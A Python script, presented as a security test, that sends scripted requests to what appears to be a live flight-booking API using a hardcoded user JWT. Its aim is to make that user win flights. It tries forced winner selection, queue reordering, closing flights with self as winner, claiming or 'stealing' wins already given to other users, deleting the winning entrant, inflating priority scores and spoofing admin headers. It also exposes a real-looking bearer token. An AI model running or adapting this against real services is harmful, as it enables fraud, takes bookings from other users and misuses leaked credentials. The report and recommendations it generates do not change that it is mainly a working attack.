#!/usr/bin/env python3
"""
COMPREHENSIVE FLIGHT WINNER MANIPULATION SECURITY TEST
Tests all possible ways to manipulate flight winner selection
"""

import requests
import json
from datetime import datetime
from typing import Dict, List, Any, Optional

# Sameer's credentials
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
USER_ID = 20254

BASE_URL = "https://vauntapi.flyvaunt.com"

# Color codes for terminal output
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

class FlightWinnerManipulationTester:
    def __init__(self):
        self.results = {
            "direct_winner_selection": [],
            "queue_position_manipulation": [],
            "force_closure_with_winner": [],
            "winner_confirmation_bypass": [],
            "entrant_id_manipulation": [],
            "priority_score_boost": [],
            "admin_override": [],
            "summary": {
                "total_tests": 0,
                "vulnerabilities_found": 0,
                "critical_findings": [],
                "can_force_win": False,
                "can_manipulate_queue": False,
                "can_claim_others_wins": False
            }
        }
        self.headers = {
            "Authorization": f"Bearer {JWT_TOKEN}",
            "Content-Type": "application/json"
        }

    def log(self, message: str, color: str = RESET, bold: bool = False):
        """Print colored log message"""
        prefix = BOLD if bold else ""
        print(f"{prefix}{color}{message}{RESET}")

    def test_endpoint(self, method: str, url: str, data: Optional[Dict] = None,
                     headers: Optional[Dict] = None, description: str = "") -> Dict:
        """Test an endpoint and return results"""
        self.results["summary"]["total_tests"] += 1

        test_headers = self.headers.copy()
        if headers:
            test_headers.update(headers)

        self.log(f"\n{'='*80}", CYAN)
        self.log(f"TEST: {description}", CYAN, bold=True)
        self.log(f"Method: {method} {url}", CYAN)
        if data:
            self.log(f"Payload: {json.dumps(data, indent=2)}", CYAN)
        if headers:
            self.log(f"Extra Headers: {json.dumps(headers, indent=2)}", CYAN)
        self.log('='*80, CYAN)

        try:
            if method == "GET":
                response = requests.get(url, headers=test_headers, timeout=10)
            elif method == "POST":
                response = requests.post(url, headers=test_headers, json=data, timeout=10)
            elif method == "PATCH":
                response = requests.patch(url, headers=test_headers, json=data, timeout=10)
            elif method == "DELETE":
                response = requests.delete(url, headers=test_headers, timeout=10)
            elif method == "PUT":
                response = requests.put(url, headers=test_headers, json=data, timeout=10)
            else:
                return {"error": "Unknown method", "vulnerable": False}

            result = {
                "method": method,
                "url": url,
                "payload": data,
                "status_code": response.status_code,
                "description": description,
                "vulnerable": False,
                "response": None,
                "error": None
            }

            try:
                result["response"] = response.json()
            except:
                result["response"] = response.text[:500]

            # Check for vulnerability indicators
            if response.status_code in [200, 201]:
                result["vulnerable"] = True
                self.log(f"STATUS: {response.status_code} - POTENTIALLY VULNERABLE!", RED, bold=True)
                self.results["summary"]["vulnerabilities_found"] += 1
            elif response.status_code == 403:
                self.log(f"STATUS: {response.status_code} - Forbidden (Good - Protected)", GREEN)
            elif response.status_code == 401:
                self.log(f"STATUS: {response.status_code} - Unauthorized (Good - Protected)", GREEN)
            elif response.status_code == 404:
                self.log(f"STATUS: {response.status_code} - Not Found (Endpoint doesn't exist)", YELLOW)
            else:
                self.log(f"STATUS: {response.status_code}", YELLOW)

            self.log(f"Response: {json.dumps(result['response'], indent=2)[:500]}", BLUE)

            return result

        except Exception as e:
            error_result = {
                "method": method,
                "url": url,
                "payload": data,
                "description": description,
                "error": str(e),
                "vulnerable": False
            }
            self.log(f"ERROR: {str(e)}", RED)
            return error_result

    def get_current_flights(self) -> List[Dict]:
        """Get list of current flights"""
        self.log("\n" + "="*80, MAGENTA, bold=True)
        self.log("FETCHING CURRENT FLIGHTS", MAGENTA, bold=True)
        self.log("="*80, MAGENTA, bold=True)

        flights = []

        # Try v1
        try:
            response = requests.get(f"{BASE_URL}/v1/flight/current",
                                   headers=self.headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list):
                    flights.extend(data)
                elif isinstance(data, dict) and 'flights' in data:
                    flights.extend(data['flights'])
                self.log(f"V1 API: Found {len(flights)} flights", GREEN)
        except Exception as e:
            self.log(f"V1 API Error: {e}", YELLOW)

        # Try v2
        try:
            response = requests.get(f"{BASE_URL}/v2/flight/current",
                                   headers=self.headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                v2_flights = []
                if isinstance(data, list):
                    v2_flights = data
                elif isinstance(data, dict) and 'flights' in data:
                    v2_flights = data['flights']
                self.log(f"V2 API: Found {len(v2_flights)} flights", GREEN)

                # Merge with v1 flights (avoid duplicates by ID)
                existing_ids = {f.get('id') for f in flights if f.get('id')}
                for f in v2_flights:
                    if f.get('id') not in existing_ids:
                        flights.append(f)
        except Exception as e:
            self.log(f"V2 API Error: {e}", YELLOW)

        # Try v3
        try:
            response = requests.get(f"{BASE_URL}/v3/flight/current",
                                   headers=self.headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                v3_flights = []
                if isinstance(data, list):
                    v3_flights = data
                elif isinstance(data, dict) and 'flights' in data:
                    v3_flights = data['flights']
                self.log(f"V3 API: Found {len(v3_flights)} flights", GREEN)

                # Merge
                existing_ids = {f.get('id') for f in flights if f.get('id')}
                for f in v3_flights:
                    if f.get('id') not in existing_ids:
                        flights.append(f)
        except Exception as e:
            self.log(f"V3 API Error: {e}", YELLOW)

        self.log(f"\nTOTAL FLIGHTS FOUND: {len(flights)}", MAGENTA, bold=True)

        # Print flight details
        for flight in flights:
            self.log(f"\n  Flight ID: {flight.get('id')}", CYAN)
            self.log(f"  Status: {flight.get('status', 'UNKNOWN')}", CYAN)
            self.log(f"  Winner: {flight.get('winner', 'None')}", CYAN)

            # Find Sameer's position
            entrants = flight.get('entrants', [])
            sameer_position = None
            sameer_entrant_id = None
            for entrant in entrants:
                if entrant.get('userId') == USER_ID:
                    sameer_position = entrant.get('queuePosition')
                    sameer_entrant_id = entrant.get('id')
                    break

            if sameer_position is not None:
                self.log(f"  Sameer's Position: {sameer_position}", YELLOW)
                self.log(f"  Sameer's Entrant ID: {sameer_entrant_id}", YELLOW)
            else:
                self.log(f"  Sameer: NOT ENTERED", YELLOW)

        return flights

    def test_direct_winner_selection(self, flights: List[Dict]):
        """Test direct winner selection endpoints"""
        self.log("\n" + "#"*80, MAGENTA, bold=True)
        self.log("# TEST CATEGORY 1: DIRECT WINNER SELECTION", MAGENTA, bold=True)
        self.log("#"*80 + "\n", MAGENTA, bold=True)

        # Find flights where Sameer is NOT position 0
        target_flights = []
        for flight in flights:
            entrants = flight.get('entrants', [])
            sameer_position = None
            for entrant in entrants:
                if entrant.get('userId') == USER_ID:
                    sameer_position = entrant.get('queuePosition')
                    break

            if sameer_position is not None and sameer_position != 0:
                target_flights.append(flight)

        if not target_flights:
            self.log("No suitable flights found (Sameer not in non-winning position)", YELLOW)
            return

        self.log(f"Testing on {len(target_flights)} flights where Sameer is not position 0", CYAN)

        for flight in target_flights[:3]:  # Test first 3 flights
            flight_id = flight.get('id')

            # Test various endpoints
            endpoints = [
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/select-winner",
                 {"userId": USER_ID}, "V1 select-winner with userId"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/select-winner",
                 {"userId": USER_ID}, "V2 select-winner with userId"),
                ("POST", f"{BASE_URL}/v3/flight/{flight_id}/select-winner",
                 {"userId": USER_ID}, "V3 select-winner with userId"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/winner",
                 {"winner": USER_ID}, "V1 winner endpoint"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/winner",
                 {"winner": USER_ID}, "V2 winner endpoint"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/set-winner",
                 {"winnerId": USER_ID}, "V2 set-winner endpoint"),
                ("POST", f"{BASE_URL}/v3/flight/{flight_id}/set-winner",
                 {"winnerId": USER_ID}, "V3 set-winner endpoint"),
                ("PATCH", f"{BASE_URL}/v1/flight/{flight_id}",
                 {"winner": USER_ID}, "V1 PATCH flight with winner"),
                ("PATCH", f"{BASE_URL}/v2/flight/{flight_id}",
                 {"winner": USER_ID}, "V2 PATCH flight with winner"),
                ("PUT", f"{BASE_URL}/v1/flight/{flight_id}/winner",
                 {"userId": USER_ID}, "V1 PUT winner"),
            ]

            for method, url, data, desc in endpoints:
                result = self.test_endpoint(method, url, data, description=desc)
                self.results["direct_winner_selection"].append(result)

                if result.get("vulnerable"):
                    self.results["summary"]["can_force_win"] = True
                    self.results["summary"]["critical_findings"].append({
                        "category": "Direct Winner Selection",
                        "finding": desc,
                        "severity": "CRITICAL",
                        "flight_id": flight_id
                    })

    def test_queue_position_manipulation(self, flights: List[Dict]):
        """Test queue position manipulation"""
        self.log("\n" + "#"*80, MAGENTA, bold=True)
        self.log("# TEST CATEGORY 2: QUEUE POSITION MANIPULATION", MAGENTA, bold=True)
        self.log("#"*80 + "\n", MAGENTA, bold=True)

        # Find flights where Sameer has a position but not 0
        target_flights = []
        for flight in flights:
            entrants = flight.get('entrants', [])
            sameer_entrant = None
            for entrant in entrants:
                if entrant.get('userId') == USER_ID:
                    sameer_entrant = entrant
                    break

            if sameer_entrant and sameer_entrant.get('queuePosition', -1) > 0:
                target_flights.append({
                    'flight': flight,
                    'entrant': sameer_entrant
                })

        if not target_flights:
            self.log("No suitable flights found (Sameer not in non-zero position)", YELLOW)
            return

        self.log(f"Testing on {len(target_flights)} flights", CYAN)

        for item in target_flights[:3]:
            flight = item['flight']
            entrant = item['entrant']
            flight_id = flight.get('id')
            entrant_id = entrant.get('id')

            endpoints = [
                ("PATCH", f"{BASE_URL}/v1/flight/{flight_id}/entrants/{entrant_id}",
                 {"queuePosition": 0}, "V1 PATCH entrant queuePosition"),
                ("PATCH", f"{BASE_URL}/v2/flight/{flight_id}/entrants/{entrant_id}",
                 {"queuePosition": 0}, "V2 PATCH entrant queuePosition"),
                ("PATCH", f"{BASE_URL}/v3/flight/{flight_id}/entrants/{entrant_id}",
                 {"queuePosition": 0}, "V3 PATCH entrant queuePosition"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/move-to-front",
                 {}, "V1 move-to-front"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/move-to-front",
                 {}, "V2 move-to-front"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/reorder",
                 {"userId": USER_ID, "position": 0}, "V1 reorder"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/reorder",
                 {"userId": USER_ID, "position": 0}, "V2 reorder"),
                ("PATCH", f"{BASE_URL}/v1/user",
                 {"queuePosition": 0}, "V1 PATCH user queuePosition"),
                ("PATCH", f"{BASE_URL}/v2/user",
                 {"queuePosition": 0}, "V2 PATCH user queuePosition"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/entrants/{entrant_id}/prioritize",
                 {}, "V1 prioritize entrant"),
                ("PUT", f"{BASE_URL}/v1/flight/{flight_id}/queue",
                 {"entrantId": entrant_id, "position": 0}, "V1 PUT queue position"),
            ]

            for method, url, data, desc in endpoints:
                result = self.test_endpoint(method, url, data, description=desc)
                self.results["queue_position_manipulation"].append(result)

                if result.get("vulnerable"):
                    self.results["summary"]["can_manipulate_queue"] = True
                    self.results["summary"]["critical_findings"].append({
                        "category": "Queue Position Manipulation",
                        "finding": desc,
                        "severity": "CRITICAL",
                        "flight_id": flight_id
                    })

    def test_force_closure_with_winner(self, flights: List[Dict]):
        """Test forcing flight closure with self as winner"""
        self.log("\n" + "#"*80, MAGENTA, bold=True)
        self.log("# TEST CATEGORY 3: FORCE FLIGHT CLOSURE WITH SELF AS WINNER", MAGENTA, bold=True)
        self.log("#"*80 + "\n", MAGENTA, bold=True)

        # Find PENDING flights
        pending_flights = [f for f in flights if f.get('status') == 'PENDING']

        if not pending_flights:
            self.log("No PENDING flights found", YELLOW)
            return

        self.log(f"Testing on {len(pending_flights)} PENDING flights", CYAN)

        for flight in pending_flights[:3]:
            flight_id = flight.get('id')

            endpoints = [
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/close",
                 {"winner": USER_ID}, "V1 close with winner"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/close",
                 {"winner": USER_ID}, "V2 close with winner"),
                ("POST", f"{BASE_URL}/v3/flight/{flight_id}/close",
                 {"winner": USER_ID}, "V3 close with winner"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/finalize",
                 {"winnerId": USER_ID}, "V1 finalize with winnerId"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/finalize",
                 {"winnerId": USER_ID}, "V2 finalize with winnerId"),
                ("POST", f"{BASE_URL}/v3/flight/{flight_id}/finalize",
                 {"winnerId": USER_ID}, "V3 finalize with winnerId"),
                ("PATCH", f"{BASE_URL}/v1/flight/{flight_id}",
                 {"status": "CLOSED", "winner": USER_ID}, "V1 PATCH status CLOSED with winner"),
                ("PATCH", f"{BASE_URL}/v2/flight/{flight_id}",
                 {"status": "CLOSED", "winner": USER_ID}, "V2 PATCH status CLOSED with winner"),
                ("PATCH", f"{BASE_URL}/v3/flight/{flight_id}",
                 {"status": "CLOSED", "winner": USER_ID}, "V3 PATCH status CLOSED with winner"),
                ("PUT", f"{BASE_URL}/v1/flight/{flight_id}/status",
                 {"status": "CLOSED", "winnerId": USER_ID}, "V1 PUT status"),
            ]

            for method, url, data, desc in endpoints:
                result = self.test_endpoint(method, url, data, description=desc)
                self.results["force_closure_with_winner"].append(result)

                if result.get("vulnerable"):
                    self.results["summary"]["can_force_win"] = True
                    self.results["summary"]["critical_findings"].append({
                        "category": "Force Closure with Winner",
                        "finding": desc,
                        "severity": "CRITICAL",
                        "flight_id": flight_id
                    })

    def test_winner_confirmation_bypass(self, flights: List[Dict]):
        """Test claiming wins from other users"""
        self.log("\n" + "#"*80, MAGENTA, bold=True)
        self.log("# TEST CATEGORY 4: WINNER CONFIRMATION BYPASS", MAGENTA, bold=True)
        self.log("#"*80 + "\n", MAGENTA, bold=True)

        # Find CLOSED flights where someone else won
        closed_flights = []
        for flight in flights:
            if flight.get('status') == 'CLOSED':
                winner = flight.get('winner')
                if winner and winner != USER_ID:
                    closed_flights.append(flight)

        if not closed_flights:
            self.log("No CLOSED flights with other winners found", YELLOW)
            return

        self.log(f"Testing on {len(closed_flights)} CLOSED flights with other winners", CYAN)

        for flight in closed_flights[:3]:
            flight_id = flight.get('id')

            endpoints = [
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/confirm",
                 {}, "V1 confirm"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/confirm",
                 {}, "V2 confirm"),
                ("POST", f"{BASE_URL}/v3/flight/{flight_id}/confirm",
                 {}, "V3 confirm"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/accept",
                 {}, "V1 accept"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/accept",
                 {}, "V2 accept"),
                ("POST", f"{BASE_URL}/v3/flight/{flight_id}/accept",
                 {}, "V3 accept"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/claim",
                 {}, "V1 claim"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/claim",
                 {}, "V2 claim"),
                ("POST", f"{BASE_URL}/v3/flight/{flight_id}/claim",
                 {}, "V3 claim"),
                ("POST", f"{BASE_URL}/v1/booking/confirm",
                 {"flightId": flight_id}, "V1 booking confirm"),
                ("POST", f"{BASE_URL}/v2/booking/confirm",
                 {"flightId": flight_id}, "V2 booking confirm"),
                ("POST", f"{BASE_URL}/v3/booking/confirm",
                 {"flightId": flight_id}, "V3 booking confirm"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/steal",
                 {}, "V1 steal"),
                ("PATCH", f"{BASE_URL}/v1/flight/{flight_id}",
                 {"winner": USER_ID}, "V1 PATCH winner after closure"),
            ]

            for method, url, data, desc in endpoints:
                result = self.test_endpoint(method, url, data, description=desc)
                self.results["winner_confirmation_bypass"].append(result)

                if result.get("vulnerable"):
                    self.results["summary"]["can_claim_others_wins"] = True
                    self.results["summary"]["critical_findings"].append({
                        "category": "Winner Confirmation Bypass",
                        "finding": desc,
                        "severity": "CRITICAL",
                        "flight_id": flight_id
                    })

    def test_entrant_id_manipulation(self, flights: List[Dict]):
        """Test entrant ID manipulation"""
        self.log("\n" + "#"*80, MAGENTA, bold=True)
        self.log("# TEST CATEGORY 5: ENTRANT ID MANIPULATION", MAGENTA, bold=True)
        self.log("#"*80 + "\n", MAGENTA, bold=True)

        # Find flights with position 0 entrant (potential winner)
        target_flights = []
        for flight in flights:
            entrants = flight.get('entrants', [])
            position_0_entrant = None
            for entrant in entrants:
                if entrant.get('queuePosition') == 0:
                    position_0_entrant = entrant
                    break

            if position_0_entrant and position_0_entrant.get('userId') != USER_ID:
                target_flights.append({
                    'flight': flight,
                    'winner_entrant': position_0_entrant
                })

        if not target_flights:
            self.log("No suitable flights found", YELLOW)
            return

        self.log(f"Testing on {len(target_flights)} flights", CYAN)

        for item in target_flights[:2]:
            flight = item['flight']
            winner_entrant = item['winner_entrant']
            flight_id = flight.get('id')
            winner_entrant_id = winner_entrant.get('id')

            endpoints = [
                ("DELETE", f"{BASE_URL}/v1/flight/{flight_id}/entrants/{winner_entrant_id}",
                 None, "V1 DELETE winner entrant"),
                ("DELETE", f"{BASE_URL}/v2/flight/{flight_id}/entrants/{winner_entrant_id}",
                 None, "V2 DELETE winner entrant"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/enter",
                 {"priorityScore": 9999999999}, "V1 enter with high priority"),
                ("POST", f"{BASE_URL}/v2/flight/{flight_id}/enter",
                 {"priorityScore": 9999999999}, "V2 enter with high priority"),
                ("POST", f"{BASE_URL}/v1/flight/{flight_id}/enter",
                 {"queuePosition": 0}, "V1 enter with position 0"),
                ("PATCH", f"{BASE_URL}/v1/flight/{flight_id}/entrants/{winner_entrant_id}",
                 {"userId": USER_ID}, "V1 PATCH entrant userId"),
            ]

            for method, url, data, desc in endpoints:
                result = self.test_endpoint(method, url, data, description=desc)
                self.results["entrant_id_manipulation"].append(result)

                if result.get("vulnerable"):
                    self.results["summary"]["can_manipulate_queue"] = True
                    self.results["summary"]["critical_findings"].append({
                        "category": "Entrant ID Manipulation",
                        "finding": desc,
                        "severity": "HIGH",
                        "flight_id": flight_id
                    })

    def test_priority_score_boost(self, flights: List[Dict]):
        """Test temporary priority score boosting"""
        self.log("\n" + "#"*80, MAGENTA, bold=True)
        self.log("# TEST CATEGORY 6: PRIORITY SCORE TEMPORARY BOOST", MAGENTA, bold=True)
        self.log("#"*80 + "\n", MAGENTA, bold=True)

        pending_flights = [f for f in flights if f.get('status') == 'PENDING'][:2]

        if not pending_flights:
            self.log("No PENDING flights found", YELLOW)
            return

        endpoints = [
            ("PATCH", f"{BASE_URL}/v1/user",
             {"priorityScore": 9999999999}, "V1 PATCH user priority"),
            ("PATCH", f"{BASE_URL}/v2/user",
             {"priorityScore": 9999999999}, "V2 PATCH user priority"),
            ("PATCH", f"{BASE_URL}/v3/user",
             {"priorityScore": 9999999999}, "V3 PATCH user priority"),
            ("PUT", f"{BASE_URL}/v1/user/{USER_ID}",
             {"priorityScore": 9999999999}, "V1 PUT user priority"),
            ("PATCH", f"{BASE_URL}/v1/user/{USER_ID}",
             {"priorityScore": 9999999999}, "V1 PATCH user by ID priority"),
        ]

        for method, url, data, desc in endpoints:
            result = self.test_endpoint(method, url, data, description=desc)
            self.results["priority_score_boost"].append(result)

            if result.get("vulnerable"):
                self.results["summary"]["can_manipulate_queue"] = True
                self.results["summary"]["critical_findings"].append({
                    "category": "Priority Score Boost",
                    "finding": desc,
                    "severity": "HIGH"
                })

    def test_admin_override(self, flights: List[Dict]):
        """Test admin winner override"""
        self.log("\n" + "#"*80, MAGENTA, bold=True)
        self.log("# TEST CATEGORY 7: ADMIN WINNER OVERRIDE", MAGENTA, bold=True)
        self.log("#"*80 + "\n", MAGENTA, bold=True)

        target_flights = flights[:3]

        if not target_flights:
            self.log("No flights found", YELLOW)
            return

        for flight in target_flights:
            flight_id = flight.get('id')

            admin_headers = [
                {"x-admin": "true"},
                {"x-role": "admin"},
                {"x-admin-override": "true"},
                {"admin": "true"},
                {"isAdmin": "true"},
                {"role": "admin"},
                {"X-Admin": "true"},
                {"X-Role": "admin"},
            ]

            for headers in admin_headers:
                result = self.test_endpoint(
                    "POST",
                    f"{BASE_URL}/v1/admin/flight/{flight_id}/select-winner",
                    {"userId": USER_ID},
                    headers=headers,
                    description=f"V1 admin select-winner with {headers}"
                )
                self.results["admin_override"].append(result)

                if result.get("vulnerable"):
                    self.results["summary"]["can_force_win"] = True
                    self.results["summary"]["critical_findings"].append({
                        "category": "Admin Override",
                        "finding": f"Admin endpoint accessible with headers: {headers}",
                        "severity": "CRITICAL",
                        "flight_id": flight_id
                    })

    def generate_report(self) -> str:
        """Generate markdown report"""
        report = []
        report.append("# FLIGHT WINNER MANIPULATION - COMPREHENSIVE SECURITY TEST RESULTS")
        report.append(f"\n**Test Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"**Tester:** Sameer (User ID: {USER_ID})")
        report.append(f"**Target:** Vaunt API ({BASE_URL})")

        report.append("\n## EXECUTIVE SUMMARY\n")
        report.append(f"- **Total Tests Executed:** {self.results['summary']['total_tests']}")
        report.append(f"- **Potential Vulnerabilities Found:** {self.results['summary']['vulnerabilities_found']}")
        report.append(f"- **Can Force Self to Win:** {'YES' if self.results['summary']['can_force_win'] else 'NO'}")
        report.append(f"- **Can Manipulate Queue Positions:** {'YES' if self.results['summary']['can_manipulate_queue'] else 'NO'}")
        report.append(f"- **Can Claim Others' Wins:** {'YES' if self.results['summary']['can_claim_others_wins'] else 'NO'}")

        if self.results['summary']['critical_findings']:
            report.append("\n## CRITICAL FINDINGS\n")
            for i, finding in enumerate(self.results['summary']['critical_findings'], 1):
                report.append(f"### {i}. {finding['category']}")
                report.append(f"- **Severity:** {finding['severity']}")
                report.append(f"- **Description:** {finding['finding']}")
                if 'flight_id' in finding:
                    report.append(f"- **Flight ID:** {finding['flight_id']}")
                report.append("")

        # Detailed results for each category
        categories = [
            ("direct_winner_selection", "Direct Winner Selection"),
            ("queue_position_manipulation", "Queue Position Manipulation"),
            ("force_closure_with_winner", "Force Flight Closure with Self as Winner"),
            ("winner_confirmation_bypass", "Winner Confirmation Bypass"),
            ("entrant_id_manipulation", "Entrant ID Manipulation"),
            ("priority_score_boost", "Priority Score Temporary Boost"),
            ("admin_override", "Admin Winner Override")
        ]

        for key, title in categories:
            results = self.results[key]
            if not results:
                continue

            report.append(f"\n## {title.upper()}\n")

            vulnerable = [r for r in results if r.get('vulnerable')]
            protected = [r for r in results if not r.get('vulnerable') and r.get('status_code') in [401, 403]]

            if vulnerable:
                report.append(f"### VULNERABLE ENDPOINTS ({len(vulnerable)})\n")
                for r in vulnerable:
                    report.append(f"#### {r['description']}")
                    report.append(f"- **Method:** {r['method']}")
                    report.append(f"- **URL:** {r['url']}")
                    report.append(f"- **Payload:** `{json.dumps(r.get('payload'))}`")
                    report.append(f"- **Status:** {r['status_code']}")
                    report.append(f"- **Response:** ```json\n{json.dumps(r.get('response'), indent=2)[:500]}\n```")
                    report.append("")

            if protected:
                report.append(f"### PROTECTED ENDPOINTS ({len(protected)})\n")
                for r in protected:
                    report.append(f"- {r['description']}: Status {r['status_code']}")

        # CVSS Scoring
        if self.results['summary']['critical_findings']:
            report.append("\n## CVSS SCORES\n")

            if self.results['summary']['can_force_win']:
                report.append("### Force Win Vulnerability")
                report.append("**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N**")
                report.append("- **Score:** 9.6 (CRITICAL)")
                report.append("- **Impact:** Users can manipulate flight winner selection to always win")
                report.append("")

            if self.results['summary']['can_claim_others_wins']:
                report.append("### Claim Others' Wins Vulnerability")
                report.append("**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N**")
                report.append("- **Score:** 9.6 (CRITICAL)")
                report.append("- **Impact:** Users can steal flight wins from other users")
                report.append("")

            if self.results['summary']['can_manipulate_queue']:
                report.append("### Queue Manipulation Vulnerability")
                report.append("**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N**")
                report.append("- **Score:** 6.5 (MEDIUM)")
                report.append("- **Impact:** Users can manipulate their queue position")
                report.append("")

        report.append("\n## RECOMMENDATIONS\n")
        report.append("1. Implement server-side authorization checks for all winner selection endpoints")
        report.append("2. Ensure queue positions can only be modified by backend winner selection algorithm")
        report.append("3. Add audit logging for all flight status and winner changes")
        report.append("4. Implement rate limiting on flight manipulation endpoints")
        report.append("5. Review and restrict admin endpoints with proper authentication")

        return "\n".join(report)

    def run_all_tests(self):
        """Run all tests"""
        self.log("\n" + "="*80, BOLD)
        self.log("FLIGHT WINNER MANIPULATION - COMPREHENSIVE SECURITY TEST", CYAN, bold=True)
        self.log("="*80 + "\n", BOLD)

        # Get current flights
        flights = self.get_current_flights()

        if not flights:
            self.log("\nNo flights found to test!", RED, bold=True)
            return

        # Run all test categories
        self.test_direct_winner_selection(flights)
        self.test_queue_position_manipulation(flights)
        self.test_force_closure_with_winner(flights)
        self.test_winner_confirmation_bypass(flights)
        self.test_entrant_id_manipulation(flights)
        self.test_priority_score_boost(flights)
        self.test_admin_override(flights)

        # Generate report
        self.log("\n" + "="*80, MAGENTA, bold=True)
        self.log("GENERATING REPORT", MAGENTA, bold=True)
        self.log("="*80 + "\n", MAGENTA, bold=True)

        report = self.generate_report()

        # Save report
        report_path = "/home/user/vaunt/FLIGHT_WINNER_MANIPULATION_RESULTS.md"
        with open(report_path, 'w') as f:
            f.write(report)

        self.log(f"\nReport saved to: {report_path}", GREEN, bold=True)

        # Print summary
        self.log("\n" + "="*80, CYAN, bold=True)
        self.log("FINAL SUMMARY", CYAN, bold=True)
        self.log("="*80, CYAN, bold=True)
        self.log(f"Total Tests: {self.results['summary']['total_tests']}", CYAN)
        self.log(f"Vulnerabilities: {self.results['summary']['vulnerabilities_found']}",
                RED if self.results['summary']['vulnerabilities_found'] > 0 else GREEN)
        self.log(f"Can Force Win: {self.results['summary']['can_force_win']}",
                RED if self.results['summary']['can_force_win'] else GREEN)
        self.log(f"Can Manipulate Queue: {self.results['summary']['can_manipulate_queue']}",
                RED if self.results['summary']['can_manipulate_queue'] else GREEN)
        self.log(f"Can Claim Others' Wins: {self.results['summary']['can_claim_others_wins']}",
                RED if self.results['summary']['can_claim_others_wins'] else GREEN)

        return report

if __name__ == "__main__":
    tester = FlightWinnerManipulationTester()
    tester.run_all_tests()
